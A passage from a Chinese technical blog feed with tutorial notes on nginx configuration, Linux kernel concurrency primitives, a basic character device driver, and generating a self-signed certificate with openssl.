title="3.1.nginx的启动方式"></a>3.1.nginx的启动方式</h4><p>nginx一般以守护进程启动,一个nginx服务至少包含一个master进程和一个work进程,master为nginx的守护进程用于管理work进程,和work进程为nginx接受请求后实际处理请求的进程</p><pre><code class=" mermaid">graph LR;1((master nginx守护进程))--&gt;2((work1 工作进程1))1--&gt;3((work2 工作进程2))1--&gt;4((work3 工作进程3))</code></pre><h4 id="3-2-nginx的请求拦截器-重点"><a href="#3-2-nginx的请求拦截器-重点" class="headerlink" title="3.2.nginx的请求拦截器(重点)"></a>3.2.nginx的请求拦截器(重点)</h4><p>nginx的location请求拦截器,用于匹配连接请求,匹配成功后由该定义的资源路径以及返回方式处理并响应</p><p>nginx的location请求的匹配方式有以下几种</p><ul><li>1.完全匹配</li><li>2.非正则匹配</li><li>3.正则匹配</li><li>4.普通匹配</li></ul><p>优先级自上而下</p><h5 id="1-精确匹配"><a href="#1-精确匹配" class="headerlink" title="1.精确匹配"></a>1.精确匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">location = /get&#123;<br>root html;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;hello you get!&quot;</span>;<br>&#125;<br><span class="hljs-comment">#精确匹配一旦成功不会去尝试匹配别的匹配规则</span><br></code></pre></td></tr></table></figure><h5 id="2-非正则匹配"><a href="#2-非正则匹配" class="headerlink" title="2.非正则匹配"></a>2.非正则匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>location ^~&#123;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;hello,world&quot;</span>;<br>&#125;<br><span class="hljs-comment">#匹配成功后不会去尝试匹配正则规则</span><br></code></pre></td></tr></table></figure><h5 id="3-正则匹配"><a href="#3-正则匹配" class="headerlink" title="3.正则匹配"></a>3.正则匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">location ~ \*.php$/ &#123;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;hello,location&quot;</span>;<br>&#125;<br>location ~* \*.php$ &#123;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-string">&quot;  &quot;</span>;<br>&#125;<br><span class="hljs-comment">#~*为不区分大小写的正则匹配</span><br></code></pre></td></tr></table></figure><h5 id="4-普通匹配-最长字符匹配"><a href="#4-普通匹配-最长字符匹配" class="headerlink" title="4.普通匹配(最长字符匹配)"></a>4.普通匹配(最长字符匹配)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /get &#123;<br>root html;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-3-nginx的日志文件以及错误重定向"><a href="#3-3-nginx的日志文件以及错误重定向" class="headerlink" title="3.3.nginx的日志文件以及错误重定向"></a>3.3.nginx的日志文件以及错误重定向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">access_log logs/access.log notice format;<span class="hljs-comment">#设置访问日志的存储路径以及日志等级和记录的日志格式</span><br>error_log logs/error.log error;<span class="hljs-comment">#设置错误日志的存储路径和记录的日志格式</span><br><br>error_page 404...(错误代码) /50x.html(重定向的location的地址)(也可以自定一个重定向的url)<br></code></pre></td></tr></table></figure><h3 id="4-nginx配置文件"><a href="#4-nginx配置文件" class="headerlink" title="4.nginx配置文件"></a>4.nginx配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#常用的参数配置</span><br><br><span class="hljs-comment">#配置nginx启动的用户和用户组</span><br>user nobody;<br><br><span class="hljs-comment">#配置nginx为守护进程方式启动</span><br>daemon on;<br><br><span class="hljs-comment">#配置nginx的worker进程数(一般配置为cpu核心数)nginx至少包含一个master进程(nginx的守护进程用于管理worker进程)</span><br>worker_processes 1;<br><br><span class="hljs-comment">#配置nginx的错误日志的存放路径以及日志等级</span><br>error_log logs/error.log notice;<br><br><span class="hljs-comment">#配置events</span><br>&#123;<br>worker_connections 1024;<span class="hljs-comment">#设置每个worker进程最大支持的连接数(和操作系统允许打开最大的文件描述符也有关系)</span><br>use epoll;<span class="hljs-comment">#设置处理事件的io模型</span><br>&#125;<br><br><span class="hljs-comment">#配置web服务</span><br>http<br>&#123;<br><span class="hljs-comment">#包含媒体文件类型</span><br>include mime.types;<br><br><span class="hljs-comment">#设置nginx默认的返回数据类型</span><br>default_type application/octet-stream;<br><br><span class="hljs-comment">#设置日志格式模板,可以用于后面日志调用</span><br>log_format main <span class="hljs-string">&quot;<span class="hljs-variable">$remote_addr</span>:<span class="hljs-variable">$time_local</span>:<span class="hljs-variable">$remote_user</span>:<span class="hljs-variable">$request</span>:<span class="hljs-variable">$status</span> <span class="hljs-variable">$body_bytes_sent</span>&quot;</span>;<br><br><span class="hljs-comment">#使用linux内核提供的sendfile来传输数据(sendfile系统调用在两个文件描述符之间直接传递数据(完全在内核中操作)，从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，操作效率很高，被称之为零拷贝。)</span><br>send_file on;<br><br><span class="hljs-comment">#(TCP_NOPUSH 是 FreeBSD 的一个 socket 选项，对应 Linux 的 TCP_CORK，Nginx 里统一用 tcp_nopush 来控制它，并且只有在启用了 sendfile 之后才生效。启用它之后，数据包会累计到一定大小之后才会发送，减小了额外开销，提高网络效率。)</span><br>tcp_nopush on;<br><br><span class="hljs-comment">#尽快发送(减小延迟,但是会增多io读取次数)</span><br>tcp_nodelay on;<br><br><span class="hljs-comment">#设置长连接的超时时间(长连接就是本来http一次完整的请求相应需要tcp三次握手四次挥手,长连接就是上一个处理完任务的连接先不进行释放,用于后续任务的再次数据收发,减少了响应时间,节省了网络资源)</span><br>keep_alive_timeout 65;<br><br><span class="hljs-comment">#开启压缩</span><br>gzip on;<br><span class="hljs-comment">#指定gzip的压缩的文件类型</span><br>gzip_types application/javascript;<br><span class="hljs-comment">#压缩等级(1-9)</span><br>gzip_comp_level 1;<br><span class="hljs-comment">#指定gzip压缩后nginx加上响应头Accept-Endcoing</span><br>gzip_vary on<br><br><span class="hljs-comment">#和操作系统有关系(一般使用默认即可)</span><br>gzip_buffers number size;<br><span class="hljs-comment">#指定http的协议版本</span><br>gzip_http_version 1.0|1.1;<br><br><span class="hljs-comment">#设置最小文件压缩的长度</span><br>gzip_min_length 1024;<br><br>valid_referer none|blocked|server_names|string....//指定是否有效的referercd<br><span class="hljs-comment">#设置是否对服务端返回的结构进行压缩</span><br>gzip_proxied off|expired|no-cache|no-store|private|no_last_modified|no_etag|auth|any;<br><span class="hljs-comment">#设置服务</span><br>server &#123;<br>listen 80;<span class="hljs-comment">#设置监听的端口</span><br>server_name localhost; <span class="hljs-comment">#服务端的名称(一般设置为域名)</span><br>location /&#123;<span class="hljs-comment">#请求拦截器</span><br>root html;<span class="hljs-comment">#资源的根目录(实际请求的目录为location目录加上根目录)</span><br><span class="hljs-comment">#alias html;#实际请求的目录为alias目录;</span><br>index index.html index.htm;<span class="hljs-comment">#设置主页的文件</span><br>&#125;<br><span class="hljs-comment">#location ~*^server#~代表后面的表达式为一个正则表达式(~*为不区分大小写的正则表达式)</span><br><span class="hljs-comment">#&#123;</span><br><span class="hljs-comment">#root html</span><br><span class="hljs-comment">#index index.php</span><br><span class="hljs-comment">#&#125;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux字符设备并发访问控制</title>
    <link href="/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    <url>/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="linux字符设备并发访问控制"><a href="#linux字符设备并发访问控制" class="headerlink" title="linux字符设备并发访问控制"></a>linux字符设备并发访问控制</h1><h3 id="1-使用原子变量"><a href="#1-使用原子变量" class="headerlink" title="1.使用原子变量"></a>1.使用原子变量</h3><h5 id="1-1-原子变量类型"><a href="#1-1-原子变量类型" class="headerlink" title="1.1.原子变量类型"></a>1.1.原子变量类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> counter;<br>&#125;<span class="hljs-type">atomic_t</span>;<br></code></pre></td></tr></table></figure><h5 id="1-2-常用的api"><a href="#1-2-常用的api" class="headerlink" title="1.2.常用的api"></a>1.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">atomic_set</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v,<span class="hljs-type">int</span> i)</span>;<span class="hljs-comment">//设置原子变量的值</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">atomic_inc</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自加1</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">atomic_dec</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自减1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">atomic_inc_and_test</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自加1       </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">atomic_dec_and_test</span><span class="hljs-params">(<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自减1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">atomic_sub_and_test</span><span class="hljs-params">(<span class="hljs-type">int</span> i,<span class="hljs-type">atomic_t</span> *v)</span>;<span class="hljs-comment">//设置原子变量自减i</span><br></code></pre></td></tr></table></figure><h3 id="2-使用自旋锁"><a href="#2-使用自旋锁" class="headerlink" title="2.使用自旋锁"></a>2.使用自旋锁</h3><h5 id="2-1-自旋锁类型"><a href="#2-1-自旋锁类型" class="headerlink" title="2.1.自旋锁类型"></a>2.1.自旋锁类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">spinlock_t</span> lock;<br></code></pre></td></tr></table></figure><h5 id="2-2-常用的api"><a href="#2-2-常用的api" class="headerlink" title="2.2.常用的api"></a>2.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//需包含头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/spinlock.h&gt;</span></span><br>spin_lock_init(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//初始化自旋锁</span><br>spin_lock(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//获得自旋锁(成功立即返回),否则直到获得该自旋锁的进程释放该自旋锁</span><br>spin_trylock(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//成功获得自旋锁立即返回,否则返回假</span><br>spin_unlock(<span class="hljs-type">spinlock_t</span> *lock);<span class="hljs-comment">//释放自旋锁</span><br></code></pre></td></tr></table></figure><h3 id="3-使用信号量"><a href="#3-使用信号量" class="headerlink" title="3.使用信号量"></a>3.使用信号量</h3><h5 id="3-1-信号量类型"><a href="#3-1-信号量类型" class="headerlink" title="3.1.信号量类型"></a>3.1.信号量类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">sem_t</span> sem<br></code></pre></td></tr></table></figure><h5 id="3-2-常用的api"><a href="#3-2-常用的api" class="headerlink" title="3.2.常用的api"></a>3.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/semaphore.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sema_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem,<span class="hljs-type">int</span> val)</span>;<span class="hljs-comment">//初始化信号量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">down</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem)</span>;<span class="hljs-comment">//深度睡眠</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">down_interruptible</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem)</span>;<span class="hljs-comment">//浅度睡眠</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem)</span>;<span class="hljs-comment">//释放信号量</span><br></code></pre></td></tr></table></figure><h3 id="4-使用互斥锁"><a href="#4-使用互斥锁" class="headerlink" title="4.使用互斥锁"></a>4.使用互斥锁</h3><h5 id="4-1-互斥锁类型"><a href="#4-1-互斥锁类型" class="headerlink" title="4.1.互斥锁类型"></a>4.1.互斥锁类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">mutex_t</span> mutex<br></code></pre></td></tr></table></figure><h5 id="4-2-常用的api"><a href="#4-2-常用的api" class="headerlink" title="4.2.常用的api"></a>4.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">mutex_init</span><span class="hljs-params">(&amp;mymutext)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">mutex_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *mutex)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">mutex_unlock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *mutex)</span>;<br></code></pre></td></tr></table></figure><h3 id="5-并发访问控制的选择"><a href="#5-并发访问控制的选择" class="headerlink" title="5.并发访问控制的选择"></a>5.并发访问控制的选择</h3><p>1.不允许睡眠的上下文采用忙等待,不可以睡眠的上下文使和中断上下文使用忙等待类</p><p>2.允许睡眠的上下文,或者临界区代码执行时间过长的建议使用阻塞类</p><p>3.中断屏蔽仅在有与中断上下文共享资源时使用</p><p>4.共享资源如果只是简单的整形变量时使用原子变量</p>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux内核驱动开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux字符设备驱动开发入门</title>
    <link href="/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <url>/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux字符设备驱动开发入门"><a href="#linux字符设备驱动开发入门" class="headerlink" title="linux字符设备驱动开发入门"></a>linux字符设备驱动开发入门</h1><h3 id="1-基本步骤"><a href="#1-基本步骤" class="headerlink" title="1.基本步骤"></a>1.基本步骤</h3><pre><code class=" mermaid">graph LR;a(&quot;申请设备号&quot;)--&gt;b(&quot;注册设备号&quot;)--&gt;c(&quot;设置设备对应的file_operations&quot;)--&gt;d(&quot;加入到内核链表&quot;)ab(&quot;MKDEV(major,minor)&quot;)--&gt;ac(&quot;register_chrdev_region()&quot;)--&gt;ad(&quot;cdev_init()&quot;)--&gt;ae(&quot;cdev_add()&quot;)</code></pre><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//驱动程序源码</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mychar</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">dev_t</span> devnum;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> curlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev</span> <span class="hljs-title">mydev</span>;</span><br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>&#125;mychardev;<br><span class="hljs-comment">//设备打开函数</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mychar_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *node,<span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    <span class="hljs-comment">//获取结构体地址</span><br>    filp-&gt;private_data = (<span class="hljs-type">void</span>*)container_of(node-&gt;i_cdev,<span class="hljs-keyword">struct</span> mychar,mydev);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mychar_close</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *node,<span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mychar_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">char</span> __user *buffer,<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count,<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *pos)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mychar_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buffer,<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count,<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *pos)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mychar_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> __init <span class="hljs-title function_">my_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//申请设备号</span><br>    mychardev.devnum = MKDEV(<span class="hljs-number">11</span>,<span class="hljs-number">256</span>);<br>    <span class="hljs-comment">//注册设备号</span><br>    <span class="hljs-keyword">if</span>(register_chrdev_region(mychardev.devnum,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;mychar&quot;</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(alloc_chrdev_region(&amp;mychardev.devnum,<span class="hljs-number">256</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;mychar&quot;</span>)!=<span class="hljs-number">0</span>)<br>        &#123;<br>            printk(<span class="hljs-string">&quot;register devnum error!\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span>=</span><br>    &#123;<br>        .owner = THIS_MODULE,<br>        .open = mychar_open,<br>        .release = mychar_close,<br>        .read = mychar_read,<br>        .write = mychar_write,<br>        .unlocked_ioctl = mychar_ioctl,<br>    &#125;<br>    <span class="hljs-comment">//设置对应的文件操作函数</span><br>    cdev_init(&amp;mychardev.mydev,&amp;fops);<br>    <span class="hljs-comment">//加入到内核链表</span><br>    cdev_add(&amp;mychardev.mydev,mychardev.devnum,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> __exit <span class="hljs-title function_">my_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    cdev_del(&amp;mychardev.mydev);<br>    unregister_chrdev_region(mychardev.devnum,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br>module_init(my_init);<br>module_exit(my_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;404NotFound&quot;</span>);<br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;just a char devices driver!&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Makefile">//项目的Makefile<br>KERNELDIR ?= /lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br>PWD ?= <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br><span class="hljs-section">modules:</span><br><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KERNELDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><span class="hljs-section">clean:</span><br>rm *.o *.mod *.symvers<br>obj-m += main.o<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux内核驱动开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议</title>
    <link href="/2022/06/06/openssl%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6/"/>
    <url>/2022/06/06/openssl%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="openssl自签证书"><a href="#openssl自签证书" class="headerlink" title="openssl自签证书"></a>openssl自签证书</h1><p>自签证书一般有三个步骤</p><ul><li><p>1.生成私钥</p></li><li><p>2.生成证书的请求信息,用于提交给ca进行签名(自己作为ca为自己签名)</p></li><li><p>3.使用私钥对证书请求信息自行签名</p></li></ul><h4 id="1-生成私钥"><a href="#1-生成私钥" class="headerlink" title="1.生成私钥"></a>1.生成私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -des3 -out server.key 2048<br><span class="hljs-comment">#生成rsa私钥，des3算法，2048位强度，server.key是秘钥文件名。</span><br></code></pre></td></tr></table></figure><h4 id="2-生成证书请求信息"><a href="#2-生成证书请求信息" class="headerlink" title="2.生成证书请求信息"></a>2.生成证书请求信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl req -new -key server.key -out server.csr<br></code></pre></td></tr></table></figure><h4 id="3-删除私钥的密码"><a href="#3-删除私钥的密码" class="headerlink" title="3.删除私钥的密码"></a>3.删除私钥的密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsa -<span class="hljs-keyword">in</span> server.key -out server.key<br></code></pre></td></tr></table></figure><h4 id="4-生成证书"><a href="#4-生成证书" class="headerlink" title="4.生成证书"></a>4.生成证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -req -days 365 -<span 